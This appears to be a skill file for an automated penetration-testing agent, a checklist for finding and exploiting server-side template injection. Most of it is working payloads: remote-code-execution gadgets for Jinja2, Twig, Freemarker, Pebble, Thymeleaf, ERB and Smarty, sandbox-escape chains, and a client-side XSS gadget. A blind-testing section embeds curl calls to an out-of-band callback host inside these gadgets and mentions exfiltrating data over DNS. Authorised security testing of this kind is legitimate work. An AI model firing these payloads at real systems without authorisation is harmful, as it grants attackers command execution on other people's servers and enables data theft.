---
name: ssti-testing
description: Server-side template injection detection, engine identification, and RCE
origin: Vigil
vuln_class: ssti
---

# Server-Side Template Injection (SSTI) Testing

## When to Activate

- User input rendered in dynamic templates (emails, PDFs, pages)
- Reflected input shows template-like behavior
- Error messages reveal template engine names or syntax

## Tools

- curl / Burp Suite Repeater
- SSTImap (automated SSTI detection and exploitation — active successor to tplmap)
- `vigil oob mint` / `vigil oob poll` (mint a nonce-tagged callback URL and correlate blind-SSTI hits — see §5 Blind SSTI; replaces reading the listener log by hand)
- Custom polyglot payloads

## Methodology

### 1. Detect Template Injection

- [ ] Inject math probe: `{{7*7}}` — look for `49` in response
- [ ] Alternate syntaxes: `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `[= 7*7 ]`
- [ ] String concat: `{{'foo'+'bar'}}` → `foobar`
- [ ] Polyglot: `${{<%[%'"}}%\.`  — observe which causes errors
- [ ] Check URL params, POST body, headers, cookie values

### 2. Identify Template Engine

#### Jinja2 / Python

- [ ] `{{config}}` — dumps Flask config
- [ ] `{{config.items()}}` — enumerate settings
- [ ] `{{self.__class__.__mro__}}` — MRO chain
- [ ] `{{request.application.__globals__}}`

#### Twig / PHP

- [ ] `{{_self.env.getFilter('id')}}` (Twig <2)
- [ ] `{{['id']|filter('system')}}` (Twig 3)
- [ ] `{{app.request.server.all|join(',')}}` — server vars

#### Freemarker / Java

- [ ] `${7*7}` → `49`
- [ ] `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] `${object.class.forName("java.lang.Runtime")}`

#### Pebble / Java

- [ ] `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`

#### Thymeleaf / Java

- [ ] `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`
- [ ] URL path-based injection in Spring Boot

#### ERB / Ruby

- [ ] `<%= 7*7 %>` → `49`
- [ ] `<%= system('id') %>`
- [ ] `<%= `id` %>`

#### Smarty / PHP

- [ ] `{php}echo `id`;{/php}` (Smarty <3)
- [ ] `{system('id')}`

### 3. Exploitation — RCE

- [ ] Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- [ ] Twig: `{{['id']|filter('system')}}`
- [ ] Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] ERB: `<%= `whoami` %>`
- [ ] Confirm with `id`, `whoami`, then escalate

### 4. Sandbox Escape

- [ ] Jinja2: walk MRO to find `subprocess.Popen` or `os.popen`
- [ ] Restricted engines: enumerate available objects and methods
- [ ] Chain gadgets through `__subclasses__()`, `__globals__`, `__builtins__`

### 5. Blind SSTI

When `{{7*7}}` evaluates server-side but the result is not reflected back (rendered into a PDF, email, or a fire-and-forget job), out-of-band is the reliable confirmation channel.

- [ ] Time-based: inject sleep or heavy computation
- [ ] **Out-of-band (preferred):** mint a nonce-tagged callback, embed it in an engine-specific RCE gadget so template execution fires the callback, then poll for the correlated hit:
      ```bash
      vigil oob status --json   # confirm readiness
      vigil oob mint --technique ssti --target-url "https://target/profile" --param bio --probe-kind http
      # -> http  http://<prefix>-<token>.oob.example.com/
      ```
      Embed the minted host in the gadget for the fingerprinted engine and deliver via the kali exec wrapper:
      ```
      Jinja2:     {{config.__class__.__init__.__globals__['os'].popen('curl http://<prefix>-<token>.oob.example.com/').read()}}
      Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://<prefix>-<token>.oob.example.com/")}
      ERB:        <%= `curl http://<prefix>-<token>.oob.example.com/` %>
      ```
      Then correlate instead of grepping the listener log:
      ```bash
      vigil oob poll --client <name> --json
      ```
      A non-empty `matched` array for your nonce confirms blind RCE — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`). A DNS-only callback (use `--probe-kind dns` and `nslookup`/`$(hostname).<host>` gadgets where curl is stripped) still confirms execution and can exfil one label of data. Empty `matched` after the payload lands → fall back to time-based/error-based and record a runtime issue.
- [ ] Error-based: force errors that leak data

## What to Record

- Parameter and endpoint where SSTI confirmed
- Template engine and version identified
- Proof payload and output
- Whether sandbox was present and bypassed
- RCE achieved (yes/no) with evidence
- Severity: Critical (RCE) or High (info leak)
- Remediation: use logic-less templates, sandbox, never pass raw user input to template render

## Kill Signals — Stop Testing When
- {{7*7}} and all probe variants return literal text (no evaluation) across all parameters → no template injection, move on
- Template engine identified AND RCE payload succeeds → CRITICAL, record and stop
- Template engine identified but sandbox blocks all RCE attempts after 5+ chains → record as MEDIUM (sandbox escape may require further research), move on

## Escalate When
- Any probe variant evaluates: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `@(7*7)` — 49 vs literal means the engine rendered, now fingerprint the engine by differential behavior (`{{7*'7'}}` is `7777777` in Jinja2, `49` in Twig, error in Freemarker) before payload selection
- The parameter feeds a rendered email, PDF export, SMS body, report template, or error page — server-side template render surfaces are under-audited, test each even when the primary response is JSON
- Literal evaluation works but direct RCE payloads fail — walk sandbox-escape gadget chains for the fingerprinted engine (`__class__.__mro__` / `config.__class__.__init__.__globals__` for Jinja2, `_self.env.registerUndefinedFilterCallback` for Twig, `freemarker.template.utility.Execute` for Freemarker)
- Client-side template engines (AngularJS 1.x `{{ }}`, Vue 2 `{{ }}`, Handlebars) reflect user input inside a template scope — CSTI escalates to XSS even when server-side SSTI fails, test `{{constructor.constructor('alert(1)')()}}` style gadgets
- A `#set`, `<%`, `{%`, `${...}`, or `#{...}` token in input changes the output shape (not just content) — partial template parsing is happening, push engine-specific gadget payloads even without arithmetic evaluation

## Extended Resources

- `agent/references/payloads/ssti-payloads.md` — per-engine detection and RCE (Jinja2, Twig, Pug, Freemarker, ERB, etc.)
